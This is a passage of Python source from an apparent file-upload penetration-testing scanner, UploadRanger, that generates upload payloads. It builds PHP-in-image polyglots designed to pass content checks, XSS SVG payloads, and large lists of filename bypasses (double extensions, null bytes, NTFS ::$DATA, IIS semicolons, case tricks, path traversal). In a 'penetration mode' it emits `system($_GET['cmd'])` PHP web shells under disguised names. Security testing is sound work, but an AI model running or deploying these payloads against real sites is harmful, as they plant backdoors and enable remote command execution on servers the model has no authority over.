            "content": jpg_content,
            "desc": "JPEG魔术字节 + PHP"
        })

        # 5.5 【新增】结构注入型 polyglot（真实底图，二轮审计在线实测缺口）：
        # magic_* 只是"签名+PHP文本"，会被 getimagesize/后端内容校验（如
        # ctf.show web02 型）拒绝；只有把 PHP 代码嵌入真实图片结构的
        # PNG tEXt / JPEG COM 段才能同时通过内容校验与 PHP 执行。
        # 探针代码 echo 本轮 nonce：执行后标签被消费、nonce 回显，
        # 与既有的 verified_execution 判定（回显 nonce + 响应≠原文 + 标签消失）闭环。
        try:
            import io as _io
            from PIL import Image as _PILImage
            # 注意:async_scanner 在 core/ 包内,polyglot_builder 在 payloads/ 包,
            # 相对导入 .polyglot_builder 会解析到 core.polyglot_builder(不存在)被
            # except 静默吞掉——必须用绝对导入(二轮在线实测踩坑)。
            from payloads.polyglot_builder import PolyglotBuilder as _PB
            _pb = _PB()
            _probe_php = (
                f"<?php echo 'UploadRanger_{self._scan_nonce}'; ?>"
                if getattr(self, "_scan_nonce", "") else "<?php echo 'UploadRanger'; ?>"
            )
            _buf = _io.BytesIO()
            _PILImage.new(
                'RGB', (16, 16),
                (random.randint(150, 255), random.randint(150, 255), random.randint(150, 255)),
            ).save(_buf, 'PNG')
            _png_bytes = _buf.getvalue()
            _struct_png = _pb.create_png_text_php(_png_bytes, _probe_php)
            payloads.append({
                "type": "polyglot_png_struct",
                "ext": "php",
                "filename": f"probe_{self._scan_nonce or 'img'}.png.php",
                "content": _struct_png,
                "desc": "PNG结构注入型图片马(真实底图,可过后端内容校验)",
            })
            _buf2 = _io.BytesIO()
            _PILImage.new(
                'RGB', (16, 16),
                (random.randint(150, 255), random.randint(150, 255), random.randint(150, 255)),
            ).save(_buf2, 'JPEG', quality=85)
            _struct_jpg = _pb.create_jpeg_com_php(_buf2.getvalue(), _probe_php)
            payloads.append({
                "type": "polyglot_jpg_struct",
                "ext": "php",
                "filename": f"probe_{self._scan_nonce or 'img'}.jpg.php",
                "content": _struct_jpg,
                "desc": "JPEG COM段注入型图片马(真实底图)",
            })
        except Exception:
            # 底图生成失败不阻断扫描（极旧 PIL 环境等），保留简化版 payload
            pass

        # 最终扩展名为图片的安全样本，用于验证“仅检查文件头”的上传点。
        # 与上面的 .php 组合体不同，它们会在用户选择 jpg/png/gif 时进入队列。
        magic_image_payloads = [
            ("jpg", "magic_image_jpg", jpg_magic, "JPEG 魔术字节图片名"),
            ("png", "magic_image_png", png_magic, "PNG 魔术字节图片名"),
            ("gif", "magic_image_gif", b"GIF89a", "GIF 魔术字节图片名"),
        ]
        for ext, payload_type, signature, desc in magic_image_payloads:
            payloads.append({
                "type": payload_type,
                "ext": ext,
                "filename": f"uploadranger_magic.{ext}",
                "content": signature + php_content,
                "fake_content_type": f"image/{'jpeg' if ext == 'jpg' else ext}",
                "desc": desc,
            })
        
        # 6. XSS SVG - 【新增】更多XSS payload
        svg_payloads = [
            b'<svg xmlns="http://www.w3.org/2000/svg" onload="console.log(\'UploadRanger\')"></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg" onload="console.log(1)"></svg>',
            b'<svg/onload=console.log(document.domain)>',
            b'<img src=x onerror=console.log(1)>',
        ]
        for i, svg in enumerate(svg_payloads):
            payloads.append({
                "type": f"xss_svg_{i}",
                "ext": "svg",
                "content": svg,
                "desc": f"XSS via SVG #{i+1}"
            })
        
        # 7. EICAR测试文件
        eicar_content = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
        payloads.append({"type": "eicar", "ext": "txt", "content": eicar_content, "desc": "EICAR测试文件"})
        
        # 8. 尾部点号绕过 (Windows)
        payloads.append({
            "type": "trailing_dot",
            "ext": "php.",
            "filename": "shell.php.",
            "content": php_content,
            "desc": "尾部点号绕过 shell.php."
        })
        
        # 9. 备用数据流 (Windows NTFS)
        payloads.append({
            "type": "alternate_data_stream",
            "ext": "php",
            "filename": "shell.php::$DATA",
            "content": php_content,
            "desc": "NTFS备用数据流 shell.php::$DATA"
        })
        
        # 10. 分号绕过 (IIS)
        payloads.append({
            "type": "semicolon_bypass",
            "ext": "php",
            "filename": "shell.asp;.jpg",
            "content": aspx_content,
            "desc": "分号绕过 (IIS) shell.asp;.jpg"
        })
        payloads.append({
            "type": "semicolon_bypass_jsp",
            "ext": "jsp",
            "filename": "shell.jsp;.jpg",
            "content": jsp_content,
            "desc": "分号绕过 (IIS) shell.jsp;.jpg"
        })
        
        # 11. 【删除】.htaccess 覆盖攻击已移除（安全风险）
        
        # 12. 文件包含 payload（安全模式为纯文本，渗透模式为真实内容）
        from config import VERSION
        safe_include_content = f"<!-- Security Test File - UploadRanger v{VERSION} -->"
        if is_penetration:
            include_payloads = [
                ("shell.php.txt", b"<?php system($_GET['cmd']); ?>"),
                ("config.php.bak", b"<?php system($_GET['cmd']); ?>"),
                ("index.php~", b"<?php system($_GET['cmd']); ?>"),
            ]
        else:
            include_payloads = [
                ("shell.php.txt", safe_include_content.encode()),
                ("config.php.bak", safe_include_content.encode()),
                ("index.php~", safe_include_content.encode()),
            ]
        for filename, content in include_payloads:
            payloads.append({
                "type": "file_include",
                "ext": filename.split('.')[-1],
                "filename": filename,
                "content": content,
                "desc": f"文件包含 {filename}"
            })
        
        # 13. 【新增】更多 ASP/ASPX 变体
        asp_variants = ["asp", "asa", "cer", "aspx", "ashx", "asmx", "asax"]
        for ext in asp_variants:
            payloads.append({
                "type": f"asp_variant_{ext}",
                "ext": ext,
                "content": aspx_content,
                "desc": f"ASP变体 .{ext}"
            })

        # 13.5 Windows可执行文件上传测试
        # 安全模式：纯文本内容；渗透模式：PE文件头
        from config import VERSION
        if is_penetration:
            pe_header = b"MZ" + b"\x00" * 58 + b"PE\x00\x00" + b"\x00" * 20
            exe_content = pe_header + f"<!-- UploadRanger v{VERSION} -->".encode()
        else:
            exe_content = f"<!-- Security Test File (EXE Placeholder) - UploadRanger v{VERSION} -->".encode()
        
        # Windows可执行文件扩展名
        exe_exts = [
            ("exe", "Windows可执行文件"),
            ("scr", "屏幕保护程序"),
            ("pif", "程序信息文件"),
            ("com", "DOS可执行文件"),
            ("dll", "动态链接库"),
        ]
        
        for ext, desc in exe_exts:
            payloads.append({
                "type": f"windows_executable_{ext}",
                "ext": ext,
                "content": exe_content,
                "desc": f"Windows {desc} .{ext}"
            })
            # 双扩展名绕过
            payloads.append({
                "type": f"windows_executable_{ext}_double",
                "ext": ext,
                "filename": f"shell.{ext}.jpg",
                "content": exe_content,
                "desc": f"Windows {desc} 双扩展名 .{ext}.jpg",
                "fake_content_type": "image/jpeg"
            })
            # 空字节绕过
            payloads.append({
                "type": f"windows_executable_{ext}_null",
                "ext": ext,
                "filename": f"shell.{ext}%00.jpg",
                "content": exe_content,
                "desc": f"Windows {desc} 空字节 .{ext}%00.jpg",
                "fake_content_type": "image/jpeg"
            })
            # 尾部点号（Windows特性）
            payloads.append({
                "type": f"windows_executable_{ext}_dot",
                "ext": ext,
                "filename": f"shell.{ext}.",
                "content": exe_content,
                "desc": f"Windows {desc} 尾部点号 .{ext}.",
            })
            # ADS备用数据流
            payloads.append({
                "type": f"windows_executable_{ext}_ads",
                "ext": ext,
                "filename": f"shell.{ext}::$DATA",
                "content": exe_content,
                "desc": f"Windows {desc} ADS .{ext}::$DATA",
            })
        
        # Windows脚本文件（安全模式：纯文本；渗透模式：真实脚本）
        if is_penetration:
            bat_content = b"@echo off\r\necho UploadRanger_Penetration_Test\r\n"
            ps1_content = b"Write-Output 'UploadRanger_PS1_Test'\r\n"
            vbs_content = b"WScript.Echo \"UploadRanger_VBS_Test\"\r\n"
        else:
            bat_content = f"@REM Security Test Script - UploadRanger v{VERSION}\r\n@REM This is a harmless test file\r\n".encode()
            ps1_content = f"# Security Test Script - UploadRanger v{VERSION}\r\n# This is a harmless test file\r\n".encode()
            vbs_content = f"' Security Test Script - UploadRanger v{VERSION}\r\n' This is a harmless test file\r\n".encode()
        
        script_payloads = [
            ("bat", bat_content, "批处理文件"),
            ("cmd", bat_content, "命令脚本"),
            ("ps1", ps1_content, "PowerShell脚本"),
            ("vbs", vbs_content, "VBScript"),
            ("js", (b"// UploadRanger_JS_Test" if is_penetration else f"// Security Test Script - UploadRanger v{VERSION}".encode()), "JScript"),
            ("hta", (b"<script>alert('UploadRanger_HTA_Test')</script>" if is_penetration else f"<!-- Security Test File - UploadRanger v{VERSION} -->".encode()), "HTML应用程序"),
            ("wsf", (b"<job><script language=\"JScript\">WScript.Echo('UploadRanger_WSF_Test')</script></job>" if is_penetration else f"<!-- Security Test File - UploadRanger v{VERSION} -->".encode()), "Windows脚本文件"),
        ]
        
        for ext, content, desc in script_payloads:
            if isinstance(content, bytes):
                pass
            else:
                content = content.encode()
            payloads.append({
                "type": f"windows_script_{ext}",
                "ext": ext,
                "content": content,
                "desc": f"Windows {desc} .{ext}"
            })
            # 双扩展名绕过
            payloads.append({
                "type": f"windows_script_{ext}_double",
                "ext": ext,
                "filename": f"shell.{ext}.txt",
                "content": content,
                "desc": f"Windows {desc} 双扩展名 .{ext}.txt",
                "fake_content_type": "text/plain"
            })

        # 14. 扩展：批量绕过变体（用于把"Payload上限"真正变成"可扩展的词库"）
        # 【删除】压缩包相关已移除（zip、rar、7z、tar、gz、bz2）
        # 用户明确选择但词库没有专用变体的格式，至少发送一次安全探测，
        # 避免 GUI 显示已选择却实际请求数为 0。
        generic_content = f"UploadRanger format probe v{VERSION}\n".encode()
        specialized_exts = {str(p.get("ext", "")).lower().lstrip(".") for p in payloads}
        if selected_exts_clean is not None:
            for selected_ext in selected_exts_clean:
                selected_ext = selected_ext.lower().lstrip(".")
                if selected_ext in specialized_exts:
                    continue
                if selected_ext == "htaccess":
                    payloads.append({
                        "type": "htaccess_probe",
                        "ext": "htaccess",
                        "filename": ".htaccess",
                        "content": b"# UploadRanger harmless configuration probe\n",
                        "fake_content_type": "text/plain",
                        "desc": ".htaccess 安全上传探测",
                    })
                else:
                    payloads.append({
                        "type": f"generic_format_{selected_ext or 'bin'}",
                        "ext": selected_ext or "bin",
                        "filename": f"uploadranger_probe.{selected_ext or 'bin'}",
                        "content": generic_content,
                        "fake_content_type": "application/octet-stream",
                        "desc": f"通用格式上传探测 .{selected_ext or 'bin'}",
                    })

        safe_exts = [
            "jpg", "jpeg", "png", "gif", "bmp", "webp", "ico", "svg",
            "txt", "log", "csv", "json", "xml", "yml", "yaml", "ini",
            "html", "htm", "css", "js", "map",
            "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx",
            "mp3", "mp4", "avi", "mov",
        ]
        # 【BUG-2修复】黑名单外的高效绕过扩展名排在前面，.php/.asp等常见黑名单排在后面
        malicious_variants = [
            # 优先：不在常见黑名单里，成功率高
            ("phtml", php_content),
            ("pht", php_content),
            ("phar", php_content),
            ("php3", php_content),
            ("php4", php_content),
            ("php5", php_content),
            ("php7", php_content),
            ("jspx", jsp_content),
            ("jspf", jsp_content),
            ("ashx", aspx_content),
            ("asmx", aspx_content),
            ("asax", aspx_content),
            ("asa", aspx_content),
            ("cer", aspx_content),
            # 后置：常见黑名单扩展名，多数情况下会被拦截
            ("php", php_content),
            ("jsp", jsp_content),
            ("aspx", aspx_content),
            ("asp", aspx_content),
        ]

        # 【BUG-10修复】大小写绕过仅对真正受黑名单限制的扩展名有意义
        # phtml/phar/php3/php4/php5/pht 本身不在常见黑名单，大小写变体无意义
        blacklisted_exts_for_case_bypass = {
            "php": php_content,
            "asp": aspx_content,
            "aspx": aspx_content,
            "jsp": jsp_content,
        }

        def _add_filename_payload(typ: str, filename: str, content: bytes, desc: str):
            payloads.append(
                {
                    "type": typ,
                    "ext": filename.rsplit(".", 1)[-1] if "." in filename else "bin",
                    "filename": filename,
                    "content": content,
                    "desc": desc,
                }
            )

        # 14a. 双扩展名组合（shell.{mal}.{safe} / shell.{safe}.{mal}）
        for mal_ext, mal_content in malicious_variants:
            for safe in safe_exts:
                _add_filename_payload(
                    f"double_ext_{mal_ext}_{safe}",
                    f"{base_name}.{mal_ext}.{safe}",
                    mal_content,
                    f"双扩展名 {mal_ext}.{safe}",
                )
                _add_filename_payload(
                    f"double_ext_{safe}_{mal_ext}",
                    f"{base_name}.{safe}.{mal_ext}",
                    mal_content,
                    f"反向双扩展名 {safe}.{mal_ext}",
                )

        # 14b. 【BUG-10修复】大小写绕过仅对黑名单扩展名（php/asp/aspx/jsp）生成
        # 【BUG-3修复】capitalize 与 first_upper_rest_lower 对短扩展名结果相同，去掉冗余
        case_variant_funcs = [
            lambda s: s.upper(),       # PHP / ASP / ASPX / JSP
            lambda s: s.capitalize(),  # Php / Asp / Aspx / Jsp
        ]
        for mal_ext, mal_content in blacklisted_exts_for_case_bypass.items():
            for fn_case in case_variant_funcs:
                v = fn_case(mal_ext)
                _add_filename_payload(
                    f"case_bypass_{mal_ext}",
                    f"{base_name}.{v}",
                    mal_content,
                    f"大小写绕过 .{v}",
                )

        # 14c. 特殊字符/分隔符（IIS/代理/后端解析差异）
        for mal_ext, mal_content in malicious_variants:
            _add_filename_payload(
                f"special_sep_{mal_ext}",
                f"{base_name}.{mal_ext};.jpg",
                mal_content,
                f"分隔符绕过 {mal_ext};.safe",
            )
            _add_filename_payload(
                f"space_bypass_{mal_ext}",
                f"{base_name}.{mal_ext} .jpg",
                mal_content,
                f"空格绕过 {mal_ext} .safe",
            )
            _add_filename_payload(
                f"trailing_space_{mal_ext}",
                f"{base_name}.{mal_ext} ",
                mal_content,
                f"尾随空格 .{mal_ext}␠",
            )

        # 14d. 路径穿越（仅文件名层面，真实是否可用取决于服务端拼接方式）
        traversal_prefixes = ["../", "..\\", "..%2f", "..%5c", ".%2e/", ".%2e%2e/"]
        for mal_ext, mal_content in malicious_variants:
            for pref in traversal_prefixes:
                _add_filename_payload(
                    f"path_traversal_{mal_ext}",
                    f"{pref}{base_name}.{mal_ext}",
                    mal_content,
                    f"路径穿越 {pref}{base_name}.{mal_ext}",
                )
        
        # 【BUG-3修复】全局去重：硬编码 section 与批量 section 可能存在重名，
        # 按文件名去重（随机名的 payload 无 filename 键，不参与去重）
        seen_filenames: set = set()
        deduped: List[dict] = []
        for p in payloads:
            fn = p.get("filename")
            if fn:
                if fn in seen_filenames:
                    continue
                seen_filenames.add(fn)
            deduped.append(p)
        
        # 【新增】根据用户选择的后缀过滤payloads
        if selected_exts_clean is not None:
            filtered: List[dict] = []
            for p in deduped:
                payload_ext = p.get("ext", "")
                # selected_extensions 是严格的目标扩展名过滤器；不能因为 payload 属于
                # “恶意变体”就绕过用户选择，否则选 jpg 仍会发送 PHP/ASP，造成配置失真。
                if payload_ext in selected_exts_clean:
                    filtered.append(p)
            deduped = filtered

        if max_limit is not None:
            return deduped[:max_limit]
        return deduped
    
    def stop(self):
        """停止扫描"""
        self.running = False


_BUILTIN_ASYNC_PAYLOAD_COUNT: Optional[int] = None


def get_builtin_async_payload_count() -> int:
    """内置异步快速扫描词库条数（与 Payload 数量上限取 min 后才是实际请求数）。"""
    global _BUILTIN_ASYNC_PAYLOAD_COUNT
    if _BUILTIN_ASYNC_PAYLOAD_COUNT is None:
        _BUILTIN_ASYNC_PAYLOAD_COUNT = len(AsyncScanner()._generate_payloads(None))
    return _BUILTIN_ASYNC_PAYLOAD_COUNT
